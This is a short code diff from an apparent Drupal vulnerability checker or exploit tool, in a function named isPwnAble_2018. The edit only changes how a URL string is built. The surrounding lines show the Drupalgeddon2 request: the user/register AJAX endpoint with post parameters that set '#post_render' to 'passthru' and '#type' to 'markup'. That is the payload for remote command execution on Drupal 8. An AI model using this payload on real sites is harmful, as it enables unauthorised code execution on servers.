@@ -67,8 +67,8 @@ def isPwnAble_2018(host, version, headers):
         else:
             return False
     if version == '8':
-        host = host + 'user/register?element_parents=account/mail/%23value\
-                        &ajax_form=1&_wrapper_format=drupal_ajax'
+        host = ''.join([host, 'user/register?element_parents=account/mail/%23',
+                        'value&ajax_form=1&_wrapper_format=drupal_ajax'])
         post_params = {'form_id': 'user_register_form', '_drupal_ajax': '1',
                        'mail[a][#post_render][]': 'passthru',
                        'mail[a][#type]': 'markup',
